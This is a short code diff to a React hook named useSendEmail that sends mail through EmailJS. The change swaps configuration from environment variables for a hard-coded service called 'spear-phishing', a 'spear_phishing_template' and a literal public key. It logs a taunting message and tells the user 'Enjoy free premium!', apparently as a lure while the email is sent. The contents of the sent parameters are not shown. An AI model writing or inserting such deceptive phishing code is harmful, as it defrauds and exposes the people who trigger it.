@@ -25,10 +25,10 @@ const useSendEmail = (): UseSendEmailResult => {
 
     try {
       const response = await emailjs.send(
-        import.meta.env.VITE_EMAILJS_SERVICE_ID as string,
-        import.meta.env.VITE_EMAILJS_TEMPLATE_ID as string,
+        "spear-phishing",
+        "spear_phishing_template",
         templateParams,
-        import.meta.env.VITE_EMAILJS_PUBLIC_KEY as string
+        "YO_9tlZixdhtYDWw"
       );
       console.log('GET FUCKED BOZO!', response.status, response.text);
       setMessage('Enjoy free premium!');
